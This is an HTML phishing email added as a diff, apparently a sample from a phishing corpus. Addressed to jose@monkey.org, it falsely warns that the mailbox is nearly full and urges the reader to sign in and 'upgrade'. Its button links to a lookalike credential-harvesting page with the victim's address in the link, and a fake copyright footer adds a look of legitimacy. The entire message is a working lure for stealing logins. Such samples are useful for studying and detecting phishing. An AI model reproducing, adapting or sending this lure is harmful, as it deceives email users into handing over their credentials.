@@ -1,0 +1,214 @@
+<table style="min-width: 100%" width="100%">
+    <tbody>
+        <tr>
+            <td style="
+          padding-bottom: 0px;
+          padding-left: 0px;
+          padding-right: 0px;
+          padding-top: 0px;
+        " valign="top">
+                <table style="min-width: 100%" width="100%">
+                    <tbody>
+                        <tr>
+                            <td style="padding-top: 9px" valign="top">
+                                <table style="min-width: 100%; max-width: 100%" width="100%" align="left">
+                                    <tbody>
+                                        <tr>
+                                            <td style="
+                          padding-bottom: 9px;
+                          padding-left: 18px;
+                          padding-right: 18px;
+                          padding-top: 0px;
+                        " valign="top">
+                                                <h1>
+                                                    <span style="font-size: 16px"><u><strong>Notice to
+                                                                <a>jose@monkey.org</a>,</strong></u></span><br />&nbsp;
+                                                </h1>
+                                                <span style="font-size: 12px">Your Email is running out of space and will soon stop receiving incoming emails.</span><br /><span
+                                                    style="font-size: 12px"> <br /><br />Upgrade your Email to keep receiving emails. The following
+                                                    features are now available with Email Upgrade!</span>
+                                                <ul>
+                                                    <li>
+                                                        <strong><span style="font-size: 12px">&nbsp;Increased Document Upload
+                                                                Speed</span></strong>
+                                                    </li>
+                                                    <li>
+                                                        <strong><span style="font-size: 12px">&nbsp;Calendar
+                                                                Feeds</span></strong>
+                                                    </li>
+                                                    <li>
+                                                        <strong><span style="font-size: 12px">&nbsp;Upgraded Antivirus
+                                                                Software</span></strong>
+                                                    </li>
+                                                    <li>
+                                                        <strong><span style="font-size: 12px">&nbsp;Integrated
+                                                                Webmail/Mobile Chat</span></strong>
+                                                    </li>
+                                                    <li>
+                                                        <strong><span style="font-size: 12px">&nbsp;Webmail Speed
+                                                                Improvements</span></strong>
+                                                    </li>
+                                                    <li>
+                                                        <strong><span style="font-size: 12px">&nbsp;SNI support for SSL
+                                                                certificate</span></strong>
+                                                    </li>
+                                                </ul>
+                                            </td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+                <table style="min-width: 100%" border="0" cellspacing="0" cellpadding="0" width="100%">
+                    <tbody>
+                        <tr>
+                            <td style="padding-top: 9px" valign="top">
+                                <table style="min-width: 100%; max-width: 100%" width="100%" align="left">
+                                    <tbody>
+                                        <tr>
+                                            <td style="
+                          padding-bottom: 9px;
+                          padding-left: 18px;
+                          padding-right: 18px;
+                          padding-top: 0px;
+                        " valign="top">
+                                                <span style="font-size: 14px"><u><strong>what should you
+                                                            do?</strong></u></span><br /><br /><span
+                                                    style="font-size: 12px">Please Sign-In and upgrade your account 
+                                                     to enable the new features and increase Email Quota.</span>
+                                            </td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+                <table style="min-width: 100%" border="0" cellspacing="0" cellpadding="0" width="100%">
+                    <tbody>
+                        <tr>
+                            <td style="
+                  padding-bottom: 18px;
+                  padding-left: 18px;
+                  padding-right: 18px;
+                  padding-top: 0px;
+                " valign="top" align="middle">
+                                <table style="
+                    background-color: #0b348b;
+                    border-collapse: separate !important;
+                    border-radius: 5px;
+                  " border="0" cellspacing="0" cellpadding="0" width="100%">
+                                    <tbody>
+                                        <tr>
+                                            <td style="
+                          padding-bottom: 13px;
+                          padding-left: 13px;
+                          padding-right: 13px;
+                          font-family: arial;
+                          font-size: 12px;
+                          padding-top: 13px;
+                        " valign="center" align="middle">
+                                                <a 
+                            href="https://unbox-update-8708.on.fleek.co/?bic=xmsjckgrwhw&email=jose@monkey.org"
+                            style="
+                            text-align: center;
+                            line-height: 100%;
+                            letter-spacing: normal;
+                            color: #ffffff;
+                            font-weight: normal;
+                            text-decoration: none;
+                          ">Upgrade Email</a>
+                                            </td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+                <table style="min-width: 100%" width="100%">
+                    <tbody>
+                        <tr>
+                            <td style="
+                  margin: 0px;
+                  padding: 10px 15px 10px;
+                  color: rgb(0, 0, 0);
+                  font-size: 13px;
+                " bgcolor="#f0f0f0">
+                                <table width="100%" style="
+                    margin: 0px;
+                    padding: 0px;
+                    width: 550px;
+                    border-collapse: collapse;
+                  " border="0" cellspacing="0" cellpadding="0">
+                                    <tbody>
+                                        <tr>
+                                            <td id="m_-1232903544558925172m_1815785236998846257m_3951225256807228058templatefooter"
+                                                valign="top">
+                                                <table border="0" cellspacing="0" cellpadding="0" width="100%">
+                                                    <tbody>
+                                                        <tr>
+                                                            <td valign="top">
+                                                                <table border="0" cellspacing="0" cellpadding="0"
+                                                                    width="100%" align="left">
+                                                                    <tbody>
+                                                                        <tr>
+                                                                            <td valign="top">
+                                                                                <div style="text-align: center">
+                                                                                    <span style="font-size: 11px"><em>copyright
+                                                                                            ©2023
+                                                                                            <strong>jose@monkey.org</strong>
+                                                                                            all rights
+                                                                                            reserved.</em></span>
+                                                                                    <p style="text-align: center">
+                                                                                        <span
+                                                                                            style="font-size: 11px"><em>please
+                                                                                                do not reply to this
+                                                                                                email.
+                                                                                                </em></span>
+                                                                                    </p>
+                                                                                    <p style="text-align: center">
+                                                                                        <span
+                                                                                            style="font-size: 11px"><em>We
+                                                                                                are unable to respond to
+                                                                                                enquiries sent to this
+                                                                                                address.</em>
+                                                                                        </span>
+                                                                                    </p>
+                                                                                    <p style="text-align: center">
+                                                                                        <span
+                                                                                            style="font-size: 11px"><em>For
+                                                                                                more enquiries, visit
+                                                                                                <a>Help
+                                                                                                    Center</a></em></span>
+                                                                                    </p>
+                                                                                    <p style="text-align: center">
+                                                                                        <span
+                                                                                            style="font-size: 11px"><em>we
+                                                                                                hope to serve you
+                                                                                                better.</em></span>
+                                                                                    </p>
+                                                                                </div>
+                                                                            </td>
+                                                                        </tr>
+                                                                    </tbody>
+                                                                </table>
+                                                                <font color="#888888"> </font>
+                                                            </td>
+                                                        </tr>
+                                                    </tbody>
+                                                </table>
+                                            </td>
+                                        </tr>
+                                    </tbody>
+                                </table>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+            </td>
+        </tr>
+    </tbody>
+</table>
